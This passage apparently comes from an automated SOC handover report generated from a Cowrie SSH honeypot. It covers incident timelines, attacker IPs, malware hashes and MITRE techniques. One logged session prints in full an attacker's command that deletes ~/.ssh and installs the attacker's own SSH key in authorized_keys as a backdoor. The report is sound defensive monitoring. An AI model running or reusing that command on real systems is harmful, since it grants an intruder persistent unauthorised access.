| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:59:17` | `cowrie.session.connect` |
| `2026-05-02 08:59:17` | `cowrie.client.version` |
| `2026-05-02 08:59:17` | `cowrie.client.kex` |
| `2026-05-02 08:59:18` | `cowrie.login.success` |
| `2026-05-02 08:59:19` | `cowrie.session.params` |
| `2026-05-02 08:59:19` | `cowrie.command.input` |
| `2026-05-02 08:59:19` | `cowrie.command.failed` |
| `2026-05-02 08:59:19` | `cowrie.log.closed` |
| `2026-05-02 08:59:20` | `cowrie.session.params` |
| `2026-05-02 08:59:20` | `cowrie.command.input` |
| `2026-05-02 08:59:20` | `cowrie.session.file_download` |
| `2026-05-02 08:59:20` | `cowrie.log.closed` |
| `2026-05-02 08:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc8e55f6116

| Field | Detail |
|---|---|
| **Source IP** | `103.76.120[.]81` |
| **First Seen** | 2026-05-02 08:59 |
| **Last Seen** | 2026-05-02 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 08:59:23` | `cowrie.session.connect` |
| `2026-05-02 08:59:23` | `cowrie.client.version` |
| `2026-05-02 08:59:23` | `cowrie.client.kex` |
| `2026-05-02 08:59:24` | `cowrie.login.success` |
| `2026-05-02 08:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.76.120[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.76.120[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `160.250.202[.]248` | **3141** | 2026-05-02 08:15 | 2026-05-02 09:11 | 1877m | 0 | `T1592` | 🟠 MEDIUM |
| `139.180.222[.]194` | **170** | 2026-05-02 06:09 | 2026-05-02 06:39 | 94m | 0 | `T1592` | 🟠 MEDIUM |
| `115.151.72[.]122` | **30** | 2026-05-02 07:40 | 2026-05-02 08:01 | 46m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.59.112[.]10` | **30** | 2026-05-02 07:11 | 2026-05-02 08:01 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.13.24[.]118` | **30** | 2026-05-02 08:03 | 2026-05-02 08:37 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `42.96.17[.]249` | **30** | 2026-05-02 07:46 | 2026-05-02 08:14 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.202[.]217` | **21** | 2026-05-02 06:32 | 2026-05-02 07:21 | 1m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.76.120[.]81` | **19** | 2026-05-02 08:20 | 2026-05-02 09:10 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `189.50.142[.]78` | **12** | 2026-05-02 06:12 | 2026-05-02 06:56 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `13.89.125[.]31` | **2** | 2026-05-02 07:00 | 2026-05-02 07:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.77.254[.]14` | **2** | 2026-05-02 09:02 | 2026-05-02 09:02 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `108.60.155[.]5` | 1 | 2026-05-02 08:36 | 2026-05-02 08:36 | 34s | 0 | `T1592` | 🟢 LOW |
| `118.33.113[.]91` | 1 | 2026-05-02 08:21 | 2026-05-02 08:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-05-02 07:58 | 2026-05-02 07:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `123.182.141[.]59` | 1 | 2026-05-02 08:44 | 2026-05-02 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.241.215[.]238` | 1 | 2026-05-02 08:21 | 2026-05-02 08:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.76.143[.]27` | 1 | 2026-05-02 07:52 | 2026-05-02 07:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.209.79[.]229` | 1 | 2026-05-02 06:55 | 2026-05-02 06:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.103.30[.]245` | 1 | 2026-05-02 06:30 | 2026-05-02 06:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `198.199.94[.]79` | 1 | 2026-05-02 08:22 | 2026-05-02 08:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.13.59[.]228` | 1 | 2026-05-02 07:08 | 2026-05-02 07:08 | 31s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | 1 | 2026-05-02 09:09 | 2026-05-02 09:10 | 15s | 0 | `T1592` | 🟢 LOW |
| `68.183.236[.]1` | 1 | 2026-05-02 08:43 | 2026-05-02 08:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.77.254[.]14` | BE | Google LLC | **100** ⚠️ | 1 |
| `181.209.79[.]229` | AR | COOPERATIVA DE ELECTRICIDAD Y OTROS SERVICIOS PUBLICOS LA PAZ LTDA | **100** ⚠️ | 2 |
| `42.96.17[.]249` | VN | Long Van System Solution JSC | **100** ⚠️ | 1 |
| `45.78.202[.]217` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `189.50.142[.]78` | BR | SAMM TECNOLOGIA E TELECOMUNICACOES S.A | **100** ⚠️ | 50 |
| `119.148.49[.]82` | BD | Agni Systems Limited, | **100** ⚠️ | 50 |
| `123.182.141[.]59` | CN | CHINANET hebei province network | **100** ⚠️ | 2 |
| `115.151.72[.]122` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `139.59.112[.]10` | SG | DigitalOcean, LLC | **100** ⚠️ | 29 |
| `103.76.120[.]81` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 22 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 242 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 149 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 66 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 32 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (216 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 202 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 3781 cases |
| Tool 34  | Credential Extractor        | ✅ 215 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 46 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 216 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 66 priority case(s) shown individually · 23 recon entry/entries in table (11 group(s) consolidating 3487 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-02T09:12:15Z_
